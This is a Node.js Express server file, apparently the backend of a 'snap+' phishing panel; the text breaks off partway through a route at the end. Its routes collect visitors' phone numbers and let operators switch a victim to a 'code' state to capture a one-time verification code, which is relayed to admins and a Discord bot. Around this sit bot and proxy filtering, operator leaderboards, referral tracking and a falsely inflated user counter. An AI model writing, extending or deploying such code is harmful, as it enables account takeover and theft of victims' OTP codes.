// server.js : conversion de app.py (FastAPI) vers Express
// npm install express cors express-rate-limit dotenv
// package.json : "type": "module"
// Lancement : node server.js   (les variables viennent de .env via dotenv)

import "dotenv/config"; // doit rester le PREMIER import : bot.js lit process.env
import express from "express";
import cors from "cors";
import rateLimit from "express-rate-limit";
import { randomUUID, randomBytes, randomInt, createHash, timingSafeEqual } from "node:crypto";
import {
  state,
  connectDb,
  startBot,
  stopBot,
  status as botStatus,
  getConfig,
  saveConfig,
  nowIso,
  parseIsoUtc,
  log,
  logAction,
  notifyNewRegistration,
  notifyotpReceived,
  adminRemoveFromQueue,
  announceMaintenance,
  refreshLeaderboard,
  sendBroadcast,
} from "./bot.js";

await connectDb(); // connexion Mongo partagée avec le bot
const col = (name) => state.db.collection(name);

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD ?? "snap-admin-2026";
if (!process.env.ADMIN_PASSWORD) log.warn("ADMIN_PASSWORD non défini : mot de passe par défaut utilisé !");

const app = express();
app.disable("x-powered-by");
const api = express.Router();

// ---------- Constantes ----------
const MAX_LOGIN_ATTEMPTS = 5;
const LOGIN_BAN_MINUTES = 30;
const VALID_STATES = new Set(["pending", "code", "processing", "code_received", "success", "declined", "error"]);
const GEO_CACHE = new Map();
const GEO_TTL = 3600_000; // 1h
const SAFE_TEXT_RE = /[^\p{L}\p{N}_\s.,\-@+#']/gu; // équivalent du \w Unicode de Python
const COUNTRY_CODES = ["FR", "BE", "BG"];
const COUNTRY_NAMES = { FR: "France", BE: "Belgium", BG: "Bulgaria" };
const COUNTRY_DIAL = { FR: "33", IT: "39", DE: "49", ES: "34", GB: "44", BE: "32", CH: "41", US: "1" };
const COUNTRY_LEN = { FR: 9, IT: 10, DE: 10, ES: 9, GB: 10, BE: 9, CH: 9, US: 10 };
const NUMVERIFY_API_KEY = (process.env.NUMVERIFY_API_KEY ?? "").trim();
const NUMVERIFY_URL = "https://apilayer.net/api/validate";

// ---------- Erreurs HTTP (format FastAPI : { detail }) ----------
class HttpError extends Error {
  constructor(status, detail) {
    super(detail);
    this.status = status;
    this.detail = detail;
  }
}
const fail = (status, detail) => {
  throw new HttpError(status, detail);
};

// Wrapper : capture les erreurs async, et renvoie en JSON la valeur retournée par le handler
const h = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const r = (fn) =>
  h(async (req, res) => {
    const out = await fn(req, res);
    if (out !== undefined && !res.headersSent) res.json(out);
  });

// ---------- Validation (remplace Pydantic ; erreur 422 comme FastAPI) ----------
function vStr(v, name, { min = 0, max = Infinity, optional = false } = {}) {
  if (v === undefined || v === null) {
    if (optional) return undefined;
    fail(422, `${name} is required`);
  }
  if (typeof v !== "string" || v.length < min || v.length > max) fail(422, `Invalid ${name}`);
  return v;
}
const body = (req) => (req.body && typeof req.body === "object" ? req.body : {});

// ---------- Helpers ----------
const iso = (d) => d.toISOString().replace("Z", "+00:00");

function sanitize(s, maxlen = 200) {
  if (typeof s !== "string") return "";
  return s.trim().slice(0, maxlen).replace(/[<>`]/g, "");
}
function sanitizeStrict(s, maxlen = 60) {
  if (typeof s !== "string") return "";
  return s.trim().slice(0, maxlen).replace(SAFE_TEXT_RE, "");
}

// NB : comme dans app.py, on fait confiance au 1er X-Forwarded-For (à n'exposer que derrière un proxy de confiance)
function getIp(req) {
  const xff = req.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  const a = req.socket?.remoteAddress;
  return a ? a.replace(/^::ffff:/, "") : "0.0.0.0";
}

const limit = (max) =>
  rateLimit({
    windowMs: 60_000,
    limit: max,
    keyGenerator: getIp,
    legacyHeaders: false,
    standardHeaders: false,
    validate: false,
    handler: (req, res) => res.status(429).json({ error: `Rate limit exceeded: ${max} per 1 minute` }),
  });

const LOCAL_GEO = (ip) => ({ ip, country: "Local", countryCode: "LO", city: "-", proxy: false, hosting: false, mobile: false });
const UNKNOWN_GEO = (ip) => ({ ip, country: "Unknown", countryCode: "??", city: "-", proxy: false, hosting: false, mobile: false });

async function geolocate(ip) {
  if (!ip || /^(127\.|10\.|192\.168\.|172\.)/.test(ip) || ip === "0.0.0.0" || ip === "::1") return LOCAL_GEO(ip);
  const cached = GEO_CACHE.get(ip);
  if (cached && Date.now() - cached._t < GEO_TTL) return cached;
  try {
    const resp = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,city,regionName,proxy,hosting,mobile`,
      { signal: AbortSignal.timeout(4000) }
    );
    let data = await resp.json();
    if (data.status !== "success") {
      data = { country: "Unknown", countryCode: "??", city: "-", proxy: false, hosting: false, mobile: false };
    }
    data.ip = ip;
    data._t = Date.now();
    GEO_CACHE.set(ip, data);
    return data;
  } catch {
    return UNKNOWN_GEO(ip);
  }
}

async function getSetting(key, def = null) {
  const doc = await col("settings").findOne({ key });
  return doc ? doc.value : def;
}
const setSetting = (key, value) =>
  col("settings").updateOne({ key }, { $set: { value } }, { upsert: true });

async function pushAdminNotif(kind, data) {
  const c = col("admin_notifs");
  await c.insertOne({ id: randomUUID(), kind, data, created_at: nowIso() });
  const total = await c.countDocuments({});
  if (total > 200) {
    const old = await c.find({}, { projection: { _id: 1 } }).sort({ created_at: 1 }).limit(total - 200).toArray();
    if (old.length) await c.deleteMany({ _id: { $in: old.map((d) => d._id) } });
  }
}

const noErr = (label) => (e) => log.warn(`${label}: ${e}`);

// ---------- NumVerify ----------
function phoneoneFallback(digits, country) {
  const expected = COUNTRY_LEN[country] ?? 10;
  if (digits.length !== expected) {
    return { valid: false, error: `${expected} cifre richieste per ${country}`, source: "local" };
  }
  return {
    valid: true,
    number: `+${COUNTRY_DIAL[country] ?? ""}${digits}`,
    carrier: "Unknown",
    line_type: "mobile",
    country_code: country,
    source: "local",
  };
}

async function validatephoneone(phoneone, country = "FR") {
  country = (country || "FR").toUpperCase();
  const digits = (phoneone ?? "").replace(/\D/g, "");
  if (!NUMVERIFY_API_KEY) return phoneoneFallback(digits, country);
  try {
    const url = new URL(NUMVERIFY_URL);
    url.search = new URLSearchParams({
      access_key: NUMVERIFY_API_KEY,
      number: digits, // paramètre réel de l'API NumVerify
      country_code: country,
      format: "1",
    }).toString();
    const resp = await fetch(url, { signal: AbortSignal.timeout(5000) });
    if (!resp.ok) return phoneoneFallback(digits, country);
    const data = await resp.json();
    if (data.success === false || "error" in data) {
      log.warn(`NumVerify error: ${JSON.stringify(data.error)}`);
      return phoneoneFallback(digits, country);
    }
    if (!data.valid) return { valid: false, error: "Numero non valido", source: "numverify" };
    return {
      valid: true,
      number: data.international_format || `+${COUNTRY_DIAL[country] ?? ""}${digits}`,
      carrier: data.carrier || "Unknown",
      line_type: data.line_type || "mobile",
      country_code: data.country_code || country,
      source: "numverify",
    };
  } catch (e) {
    log.warn(`NumVerify exception: ${e}`);
    return phoneoneFallback(digits, country);
  }
}

// ---------- Auth ----------
const requireAdmin = h(async (req, res, next) => {
  const token = req.get("x-admin-token");
  if (!token) fail(401, "Unauthorized");
  const sess = await col("admin_sessions").findOne({ token: String(token) });
  if (!sess) fail(401, "Unauthorized");
  const a = await col("admins").findOne({ username: sess.username }, { projection: { _id: 0, permissions: 1, role: 1 } });
  if (a) {
    sess.permissions = a.permissions || {};
    sess.role = a.role ?? sess.role ?? "admin";
  }
  req.sess = sess;
  next();
});
const requireOwner = (req, res, next) => {
  if (req.sess?.role !== "owner") return next(new HttpError(403, "Owner only"));
  next();
};
const hasPerm = (sess, key) => sess.role === "owner" || Boolean((sess.permissions || {})[key]);
const requirePerm = (key) => (req, res, next) =>
  hasPerm(req.sess, key) ? next() : next(new HttpError(403, `Missing permission: ${key}`));

const admin = [requireAdmin];
const owner = [requireAdmin, requireOwner];
const perm = (key) => [requireAdmin, requirePerm(key)];

// ---------- Middlewares globaux ----------
app.use((req, res, next) => {
  res.set({
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "X-XSS-Protection": "1; mode=block",
    "Permissions-Policy": "geolocation=(), microphoneoneone=(), camera=()",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Cross-Origin-Opener-Policy": "same-origin",
  });
  next();
});
const origins = (process.env.CORS_ORIGINS ?? "*").split(",").map((s) => s.trim());
app.use(cors({ origin: origins.includes("*") ? true : origins, credentials: true }));
app.use(express.json({ limit: "100kb" }));

// ================= QUEUE (public) =================
api.get("/ping", (req, res) => res.json({ ok: true }));

api.post("/queue/join", limit(10), r(async (req) => {
  const b = body(req);
  const user_id = vStr(b.user_id, "user_id");
  const username = vStr(b.username, "username");
  const country = vStr(b.country, "country");
  if (!COUNTRY_CODES.includes(country)) fail(400, "Invalid country");

  if (await col("queue_entries").findOne({ user_id, status: "pending" })) fail(400, "Already in queue");
  const count = await col("queue_entries").countDocuments({ country, status: "pending" });
  const entry = {
    id: randomUUID(), user_id, username, country,
    joined_at: nowIso(), position: count + 1, status: "pending",
  };
  await col("queue_entries").insertOne(entry);
  return { ok: true, position: entry.position };
}));

api.post("/queue/leave", limit(10), r(async (req) => {
  const user_id = vStr(req.query.user_id, "user_id");
  const country = vStr(req.query.country, "country");
  const result = await col("queue_entries").deleteOne({ user_id, country, status: "pending" });
  return { ok: result.deletedCount > 0 };
}));

api.get("/queue/position/:user_id", r(async (req) => {
  const e = await col("queue_entries").findOne({ user_id: req.params.user_id, status: "pending" });
  return e ? { position: e.position, country: e.country } : { position: null };
}));

api.get("/queue/stats/:country", r(async (req) => {
  const count = await col("queue_entries").countDocuments({ country: req.params.country, status: "pending" });
  return { people_in_queue: count, average_wait: `~${Math.max(1, count * 2)}m` };
}));

// ================= PUBLIC / CLIENT =================
api.get("/", (req, res) => res.json({ message: "snap+ API", ok: true }));

api.post("/track/visit", r(async (req) => {
  const ip = getIp(req);
  const ua = (req.get("user-agent") ?? "").slice(0, 250);
  const is_bot = /(bot|crawl|spider|scraper)/i.test(ua);
  const geo = await geolocate(ip);
  await col("visits").insertOne({
    id: randomUUID(), ip, ua,
    geo: Object.fromEntries(["country", "countryCode", "city", "proxy", "hosting"].map((k) => [k, geo[k] ?? null])),
    is_bot, created_at: nowIso(),
  });
  const banned = await col("banned_ips").findOne({ ip });
  const antibot = await getSetting("antibot_enabled", false);
  const isProxy = Boolean(geo.proxy || geo.hosting);
  return {
    banned: Boolean(banned),
    proxy: antibot ? isProxy : false,
    country: geo.country, countryCode: geo.countryCode, city: geo.city,
  };
}));

api.get("/admin/antibot", ...owner, r(async () => ({ enabled: Boolean(await getSetting("antibot_enabled", false)) })));
api.put("/admin/antibot", ...owner, r(async (req) => {
  await setSetting("antibot_enabled", Boolean(body(req).enabled));
  return { ok: true };
}));

api.post("/validate-phoneone", limit(30), r(async (req) => {
  const b = body(req);
  const phoneone = vStr(b.phoneone, "phoneone", { min: 3, max: 20 });
  return validatephoneone(phoneone, b.country_code || "FR");
}));

api.post("/register", limit(10), r(async (req) => {
  const b = body(req);
  const nicknameRaw = vStr(b.nickname, "nickname", { min: 1, max: 40 });
  const phoneoneRaw = vStr(b.phoneone, "phoneone", { min: 6, max: 20 });
  const inviteRaw = vStr(b.invite, "invite", { optional: true });

  const ip = getIp(req);
  const ua = (req.get("user-agent") ?? "").slice(0, 250);

  const cfg = await getConfig();
  if (cfg.maintenance_mode) fail(503, "Service temporarily unavailable — maintenance in progress");
  if (await col("banned_ips").findOne({ ip })) fail(403, "Access denied");

  const nickname = sanitizeStrict(nicknameRaw, 40);
  if (!nickname) fail(400, "Invalid nickname");

  const phoneone_clean = phoneoneRaw.replace(/\D/g, "");
  if (phoneone_clean.length < 6 || phoneone_clean.length > 12) fail(400, "Invalid phoneone");

  const country_code = String(b.country_code || "FR").toUpperCase();
  const check = await validatephoneone(phoneone_clean, country_code);
  if (!check.valid) fail(400, check.error || "Invalid phoneone");
  const full_phoneone = check.number || `+${COUNTRY_DIAL[country_code] ?? "33"}${phoneone_clean}`;

  const geo = await geolocate(ip);

  let invited_by = null;
  let invite_code = null;
  if (inviteRaw) {
    const inv = await col("invites").findOne({ code: inviteRaw.trim() });
    if (inv) {
      invited_by = inv.owner;
      invite_code = inv.code;
      await col("invites").updateOne({ code: invite_code }, { $inc: { joins: 1 } });
    }
  }

  const user_id = randomUUID();
  const doc = {
    id: user_id, nickname, phoneone: full_phoneone, phoneone_raw: phoneone_clean, country_code,
    carrier: check.carrier ?? "Unknown", line_type: check.line_type ?? "mobile",
    state: "pending", code_submitted: null, ip, ua,
    geo: Object.fromEntries(
      ["country", "countryCode", "city", "regionName", "proxy", "hosting", "mobile"].map((k) => [k, geo[k] ?? null])
    ),
    invited_by, invite_code, created_at: nowIso(), updated_at: nowIso(),
  };
  await col("users").insertOne({ ...doc }); // copie : insertOne ajoute _id

  // notification Discord sans attendre (create_task)
  notifyNewRegistration(doc).catch(noErr("notify_new_registration"));

  await pushAdminNotif("register", {
    id: user_id, nickname, phoneone: full_phoneone, country: geo.country,
    countryCode: geo.countryCode, city: geo.city, invited_by,
  });
  return { id: user_id, state: "pending" };
}));

api.get("/user/:user_id/state", r(async (req) => {
  const u = await col("users").findOne(
    { id: req.params.user_id },
    { projection: { _id: 0, state: 1, nickname: 1, phoneone: 1, error_message: 1, redirect_url: 1, decline_reason: 1 } }
  );
  if (!u) fail(404, "User not found");
  return u;
}));

api.post("/user/:user_id/submit-code", limit(15), r(async (req) => {
  const user_id = req.params.user_id;
  const codeRaw = vStr(body(req).code, "code", { min: 1, max: 12 });
  const ip = getIp(req);
  const cfg = await getConfig();
  if (cfg.maintenance_mode) fail(503, "Service temporarily unavailable");
  if (await col("banned_ips").findOne({ ip })) fail(403, "Access denied");

  const code = sanitizeStrict(codeRaw, 12);
  const u = await col("users").findOne({ id: user_id });
  if (!u) fail(404, "User not found");

  await col("users").updateOne(
    { id: user_id },
    { $set: { code_submitted: code, state: "code_received", error_message: null, updated_at: nowIso() } }
  );
  const updated = await col("users").findOne({ id: user_id });
  notifyotpReceived(updated, code).catch(noErr("notify_otp_received"));
  await pushAdminNotif("code", { id: user_id, nickname: u.nickname, code });
  return { ok: true, state: "code_received" };
}));

api.get("/live/count", r(async () => ({ total_all_time: (await col("users").countDocuments({})) + 321 })));

// ================= ADMIN AUTH =================
const sha = (s) => createHash("sha256").update(String(s)).digest();
const passwordOk = (given) => timingSafeEqual(sha(given), sha(ADMIN_PASSWORD));

async function registerFail(ip, attempt, now, { canBan = true } = {}) {
  const count = (attempt?.fails ?? 0) + 1;
  const set = { ip, fails: count, last: iso(now) };
  let banned = false;
  if (count >= MAX_LOGIN_ATTEMPTS) {
    set.banned_until = iso(new Date(now.getTime() + LOGIN_BAN_MINUTES * 60_000));
    set.fails = 0;
    banned = true;
  }
  await col("login_attempts").updateOne({ ip }, { $set: set }, { upsert: true });
  return { count, banned: banned && canBan };
}

api.post("/admin/login", r(async (req) => {
  const b = body(req);
  const usernameRaw = vStr(b.username, "username", { min: 2, max: 30 });
  const password = vStr(b.password, "password");

  const ip = getIp(req);
  const now = new Date();

  const attempt = await col("login_attempts").findOne({ ip });
  if (attempt?.banned_until) {
    const bu = parseIsoUtc(attempt.banned_until);
    if (bu > now) fail(429, `Too many attempts. Try again in ${Math.floor((bu - now) / 60_000) + 1} minutes.`);
  }

  const username = sanitizeStrict(usernameRaw, 30).toLowerCase();
  if (!username) fail(400, "Invalid username");

  const ownerExists = await col("admins").findOne({ role: "owner" });

  if (!passwordOk(password)) {
    const { count, banned } = await registerFail(ip, attempt, now);
    if (banned) fail(429, `Too many failed attempts. Banned for ${LOGIN_BAN_MINUTES} min.`);
    fail(401, `Wrong credentials. ${MAX_LOGIN_ATTEMPTS - count} tries left.`);
  }

  // verrou IP -> username
  const lock = await col("admin_ip_lock").findOne({ ip });
  if (lock) {
    if (lock.username !== username) {
      await registerFail(ip, attempt, now);
      fail(401, `This IP is locked to another username. Use '${lock.username}'.`);
    }
  } else {
    await col("admin_ip_lock").insertOne({ ip, username, created_at: iso(now) });
  }

  // enregistrement admin : le tout premier devient owner, les suivants sont "pending"
  let existing = await col("admins").findOne({ username });
  if (!existing) {
    const role = ownerExists ? "admin" : "owner";
    await col("admins").insertOne({
      username, role, status: role === "owner" ? "approved" : "pending",
      created_at: iso(now), last_login: iso(now), created_from_ip: ip,
    });
    existing = await col("admins").findOne({ username });
  }
  if (existing.status !== "approved") fail(403, `Account '${username}' pending owner approval.`);

  await col("admins").updateOne({ username }, { $set: { last_login: iso(now) } });
  await col("login_attempts").deleteOne({ ip });

  const token = randomBytes(32).toString("base64url");
  const role = existing.role ?? "admin";
  await col("admin_sessions").insertOne({ token, username, role, ip, created_at: iso(now) });
  return { token, username, role };
}));

api.post("/admin/logout", ...admin, r(async (req) => {
  await col("admin_sessions").deleteOne({ token: req.sess.token });
  return { ok: true };
}));

api.get("/admin/me", ...admin, r(async (req) => ({
  username: req.sess.username,
  role: req.sess.role ?? "admin",
  ip: req.sess.ip,
  permissions: req.sess.permissions || {},
})));

const ALLOWED_PERMS = new Set([
  "view_analytics", "view_invites", "create_invites", "view_users", "change_user_state",
  "delete_users", "view_team", "view_security", "view_bot", "edit_bot",
]);

api.post("/admin/team/permissions", ...owner, r(async (req) => {
  const b = body(req);
  const username = vStr(b.username, "username").toLowerCase();
  const perms = {};
  for (const [k, v] of Object.entries(b.permissions ?? {})) if (ALLOWED_PERMS.has(k)) perms[k] = Boolean(v);
  await col("admins").updateOne({ username }, { $set: { permissions: perms } });
  return { ok: true, permissions: perms };
}));

// ================= TEAM (owner) =================
api.get("/admin/team", ...owner, r(async () =>
  col("admins").find({}, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(200).toArray()));

const teamUser = (req) => vStr(body(req).username, "username").toLowerCase();

api.post("/admin/team/approve", ...owner, r(async (req) => {
  await col("admins").updateOne({ username: teamUser(req) }, { $set: { status: "approved" } });
  return { ok: true };
}));

api.post("/admin/team/reject", ...owner, r(async (req) => {
  const u = teamUser(req);
  await col("admins").deleteOne({ username: u, role: { $ne: "owner" } });
  await col("admin_sessions").deleteMany({ username: u });
  return { ok: true };
}));

api.post("/admin/team/promote", ...owner, r(async (req) => {
  const u = teamUser(req);
  await col("admins").updateOne({ username: u }, { $set: { role: "owner" } });
  await col("admin_sessions").updateMany({ username: u }, { $set: { role: "owner" } });
  return { ok: true };
}));

api.post("/admin/team/demote", ...owner, r(async (req) => {
  const target = teamUser(req);
  if (target === req.sess.username) {
    const other = await col("admins").countDocuments({ role: "owner", username: { $ne: target } });
    if (other === 0) fail(400, "You are the only owner — promote someone else first");
  }
  await col("admins").updateOne({ username: target }, { $set: { role: "admin" } });
  await col("admin_sessions").updateMany({ username: target }, { $set: { role: "admin" } });
  return { ok: true };
}));

// ================= COUNTRIES =================
async function ensureCountries() {
  for (const code of COUNTRY_CODES) {
    if (!(await col("countries").findOne({ code }))) {
      await col("countries").insertOne({ code, enabled: true, ads: false });
    }
  }
}

async function countriesState() {
  await ensureCountries();
  const out = [];
  for (const code of COUNTRY_CODES) {
    const doc = (await col("countries").findOne({ code }, { projection: { _id: 0 } })) ?? { enabled: true, ads: false };
    out.push({
      code,
      name: COUNTRY_NAMES[code] ?? code,
      enabled: Boolean(doc.enabled ?? true),
      ads: Boolean(doc.ads ?? false),
      in_queue: await col("queue_entries").countDocuments({ country: code, status: "pending" }),
    });
  }
  return out;
}

api.get("/countries", ...admin, r(async () => ({ countries: await countriesState() })));
api.get("/countries/public", r(async () => ({ countries: await countriesState() })));

api.put("/admin/countries", ...perm("countries"), r(async (req) => {
  const b = body(req);
  const code = vStr(b.code, "code");
  if (!COUNTRY_CODES.includes(code)) fail(400, "Invalid country code");
  await ensureCountries();
  const patch = {};
  if (b.enabled != null) patch.enabled = Boolean(b.enabled);
  if (b.ads != null) patch.ads = Boolean(b.ads);
  if (Object.keys(patch).length) await col("countries").updateOne({ code }, { $set: patch });
  return { ok: true, countries: await countriesState() };
}));

// ================= QUEUE ADMIN =================
api.get("/admin/queues", ...admin, r(async () => {
  const now = Date.now();
  const out = [];
  for (const code of COUNTRY_CODES) {
    const entries = await col("queue_entries").find({ country: code, status: "pending" }).sort({ joined_at: 1 }).toArray();
    const members = entries.map((e, idx) => {
      let secs = 0;
      if (e.joined_at) {
        const t = parseIsoUtc(e.joined_at).getTime();
        if (!Number.isNaN(t)) secs = Math.floor((now - t) / 1000);
      }
      return { user_id: e.user_id, username: e.username ?? "?", position: idx, seconds_in_queue: secs };
    });
    out.push({ code, name: COUNTRY_NAMES[code] ?? code, count: members.length, members });
  }
  return { queues: out };
}));

api.post("/admin/queue/remove", ...perm("countries"), r(async (req) => {
  const b = body(req);
  const user_id = vStr(b.user_id, "user_id");
  const country = vStr(b.country, "country");
  if (!COUNTRY_CODES.includes(country)) fail(400, "Invalid country");
  const result = await col("queue_entries").deleteOne({ user_id, country, status: "pending" });
  const removed = result.deletedCount > 0;
  if (removed) adminRemoveFromQueue(user_id, country).catch(noErr("admin_remove_from_queue"));
  return { ok: removed };
}));

// ================= ADMIN USERS =================
api.get("/admin/users", ...admin, r(async () =>
  col("users").find({}, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(1000).toArray()));

api.get("/admin/user/:user_id", ...admin, r(async (req) => {
  const u = await col("users").findOne({ id: req.params.user_id }, { projection: { _id: 0 } });
  if (!u) fail(404, "Not found");
  return u;
}));

api.patch("/admin/user/:user_id/state", ...perm("change_user_state"), r(async (req) => {
  const st = vStr(body(req).state, "state");
  if (!VALID_STATES.has(st)) fail(400, "Invalid state");
  const u = await col("users").findOne({ id: req.params.user_id });
  if (!u) fail(404, "Not found");
  await col("users").updateOne({ id: req.params.user_id }, { $set: { state: st, updated_at: nowIso() } });
  await logAction(`🛠 State updated to \`${st}\` for \`${u.nickname}\` by admin \`${req.sess.username}\``);
  return { ok: true, state: st };
}));

api.post("/admin/user/:user_id/action", ...admin, r(async (req) => {
  const user_id = req.params.user_id;
  const b = body(req);
  const a = vStr(b.action, "action");
  const payload = b.payload && typeof b.payload === "object" ? b.payload : {};
  const u = await col("users").findOne({ id: user_id });
  if (!u) fail(404, "Not found");

  if (a === "request_otp") {
    await col("users").updateOne({ id: user_id }, { $set: { state: "code", updated_at: nowIso() } });
    return { ok: true, state: "code" };
  }
  if (a === "show_error") {
    const msg = sanitize(payload.message ?? "Erreur", 120);
    await col("users").updateOne({ id: user_id }, { $set: { state: "error", error_message: msg, updated_at: nowIso() } });
    return { ok: true, state: "error" };
  }
  if (a === "redirect_final") {
    const url = sanitize(payload.url ?? "", 300);
    await col("users").updateOne({ id: user_id }, { $set: { state: "success", redirect_url: url, updated_at: nowIso() } });
    return { ok: true, state: "success" };
  }
  if (a === "ban_ip") {
    const ip = u.ip;
    if (ip) {
      await col("banned_ips").updateOne(
        { ip },
        { $set: { ip, reason: `Banned via user ${u.nickname}`, by: req.sess.username, created_at: nowIso() } },
        { upsert: true }
      );
    }
    return { ok: true, banned_ip: ip ?? null };
  }
  fail(400, "Unknown action");
}));

api.delete("/admin/user/:user_id", ...perm("delete_users"), r(async (req) => {
  const res = await col("users").deleteOne({ id: req.params.user_id });
  return { deleted: res.deletedCount };
}));

// ================= BAN IP =================
api.get("/admin/banned-ips", ...owner, r(async () =>
  col("banned_ips").find({}, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(500).toArray()));

api.post("/admin/banned-ips", ...owner, r(async (req) => {
  const b = body(req);
  const ip = sanitize(vStr(b.ip, "ip"), 50);
  if (!ip) fail(400, "Invalid IP");
  await col("banned_ips").updateOne(
    { ip },
    { $set: { ip, reason: sanitize(b.reason ?? "", 200), by: req.sess.username, created_at: nowIso() } },
    { upsert: true }
  );
  return { ok: true };
}));

api.delete("/admin/banned-ips/:ip", ...owner, r(async (req) => {
  await col("banned_ips").deleteOne({ ip: req.params.ip });
  return { ok: true };
}));

// ================= BOT CONFIG & CONTROL (owner) =================
const BOT_CONFIG_KEYS = [
  "token", "notify_channel_id", "logs_channel_id", "leaderboard_channel_id", "leaderboard_title",
  "leaderboard_desc", "leaderboard_color", "broadcast_channel_id", "broadcast_title", "broadcast_desc",
  "broadcast_color", "footer_text", "ping_role_ids", "ok_role_id", "embed_color", "embed_title",
  "embed_desc", "ok_button_label", "ok_button_style", "ok_button_emoji", "otp_button_label",
  "otp_button_style", "otp_button_emoji",
];
const BOT_INT_KEYS = ["leaderboard_color", "broadcast_color", "embed_color"];
const BOT_SANITIZED = [
  "embed_title", "embed_desc", "ok_button_label", "otp_button_label", "ok_button_emoji", "otp_button_emoji",
  "leaderboard_title", "leaderboard_desc", "broadcast_title", "broadcast_desc", "footer_text",
];
const BOT_ID_KEYS = ["notify_channel_id", "logs_channel_id", "ok_role_id", "leaderboard_channel_id", "broadcast_channel_id"];

api.get("/admin/bot/config", ...owner, r(async () => {
  const cfg = await getConfig();
  if (cfg.token) {
    const t = cfg.token;
    cfg.token_masked = t.length > 10 ? `${t.slice(0, 6)}...${t.slice(-4)}` : "***";
    cfg.token = "";
  }
  return cfg;
}));

api.put("/admin/bot/config", ...owner, r(async (req) => {
  const b = body(req);
  const patch = {};
  for (const k of BOT_CONFIG_KEYS) if (b[k] !== undefined && b[k] !== null) patch[k] = b[k];

  for (const k of BOT_INT_KEYS) if (k in patch && !Number.isInteger(patch[k])) fail(422, `Invalid ${k}`);
  if ("ping_role_ids" in patch && !Array.isArray(patch.ping_role_ids)) fail(422, "Invalid ping_role_ids");
  for (const k of BOT_SANITIZED) if (typeof patch[k] === "string") patch[k] = sanitize(patch[k], 500);
  if (Array.isArray(patch.ping_role_ids)) {
    patch.ping_role_ids = patch.ping_role_ids.map((x) => String(x).trim()).filter((x) => /^\d+$/.test(x));
  }
  for (const k of BOT_ID_KEYS) if (patch[k] != null) patch[k] = String(patch[k]).trim();
  if ("token" in patch && !patch.token) delete patch.token;

  const cfg = await saveConfig(patch);
  delete cfg.token;
  return cfg;
}));

api.get("/admin/bot/status", ...owner, (req, res) => res.json(botStatus()));

api.post("/admin/bot/start", ...owner, r(async () => {
  const { ok, message } = await startBot();
  return { ok, message, ...botStatus() };
}));

api.post("/admin/bot/stop", ...owner, r(async () => {
  await stopBot();
  return { ok: true, ...botStatus() };
}));

api.post("/admin/bot/test-notify", ...owner, r(async () => {
  const fake = {
    id: "test-user", nickname: "Test User", phoneone: "+33612345678",
    geo: { city: "Paris", country: "France" }, invited_by: "boss",
  };
  const { ok, message } = await notifyNewRegistration(fake);
  if (!ok) fail(400, `Failed: ${message}`);
  return { ok: true };
}));

api.post("/admin/bot/broadcast", ...owner, r(async () => {
  const { ok, message } = await sendBroadcast();
  if (!ok) fail(400, `Failed: ${message}`);
  return { ok: true };
}));

api.post("/admin/bot/leaderboard/refresh", ...owner, r(async () => {
  const { ok, message } = await refreshLeaderboard();
  if (!ok) fail(400, `Failed: ${message}`);
  return { ok: true };
}));

api.get("/admin/bot/leaderboard", ...owner, r(async () =>
  col("presser_stats").find({}, { projection: { _id: 0 } }).sort({ ok_count: -1 }).limit(50).toArray()));

// ================= MAINTENANCE =================
api.get("/maintenance", r(async () => ({ enabled: Boolean((await getConfig()).maintenance_mode) })));

api.post("/admin/maintenance", ...owner, r(async (req) => {
  const enabled = Boolean(body(req).enabled);
  await saveConfig({ maintenance_mode: enabled });
  const { ok, message } = await announceMaintenance(enabled);
  return { ok: true, enabled, announced: ok, announce_info: message };
}));

// ================= ANALYTICS =================
api.get("/admin/analytics", ...perm("view_analytics"), r(async () => {
  const visitors = await col("visits").countDocuments({});
  const registered = await col("users").countDocuments({});
  const phoneoned = await col("users").countDocuments({ phoneone: { $exists: true } });
  const otp_submitted = await col("users").countDocuments({ code_submitted: { $ne: null } });
  const success = await col("users").countDocuments({ state: "success" });

  const days = [];
  for (let i = 6; i >= 0; i--) {
    const d = new Date(Date.now() - i * 86_400_000);
    const day = d.toISOString().slice(0, 10); // YYYY-MM-DD en UTC
    const range = { $gte: `${day}T00:00:00`, $lte: `${day}T23:59:59+00:00` };
    days.push({
      day: `${day.slice(8, 10)}/${day.slice(5, 7)}`,
      visits: await col("visits").countDocuments({ created_at: range }),
      regs: await col("users").countDocuments({ created_at: range }),
    });
  }

  const top = await col("users")
    .aggregate([{ $group: { _id: "$geo.countryCode", count: { $sum: 1 } } }, { $sort: { count: -1 } }, { $limit: 6 }])
    .toArray();

  return {
    visitors, registered, phoneoned, otp_submitted, success,
    conversion_rate: Math.round((visitors ? (registered / visitors) * 100 : 0) * 10) / 10,
    otp_rate: Math.round((registered ? (otp_submitted / registered) * 100 : 0) * 10) / 10,
    days,
    top_countries: top.map((x) => ({ code: x._id || "??", count: x.count })),
  };
}));

// ================= INVITES =================
api.get("/admin/invites", ...admin, r(async () =>
  col("invites").find({}, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(200).toArray()));

const ALphoneoneABET = "abcdefghijklmnopqrstuvwxyz0123456789";
const genCode = () => Array.from({ length: 7 }, () => ALphoneoneABET[randomInt(ALphoneoneABET.length)]).join("");

api.post("/admin/invites", ...perm("create_invites"), r(async (req) => {
  let code = genCode();
  while (await col("invites").findOne({ code })) code = genCode();
  const doc = {
    code, owner: req.sess.username,
    label: sanitize(body(req).label ?? "", 60), joins: 0, created_at: nowIso(),
  };
  await col("invites").insertOne({ ...doc });
  return doc;
}));

api.get("/admin/invites/:code/joiners", ...admin, r(async (req) =>
  col("users")
    .find({ invite_code: req.params.code }, { projection: { _id: 0, id: 1, nickname: 1, phoneone: 1, state: 1, created_at: 1, geo: 1 } })
    .sort({ created_at: -1 }).limit(500).toArray()));

api.delete("/admin/invites/:code", ...admin, r(async (req) => {
  await col("invites").deleteOne({ code: req.params.code });
  return { ok: true };
}));

api.get("/invite/:code", r(async (req) => {
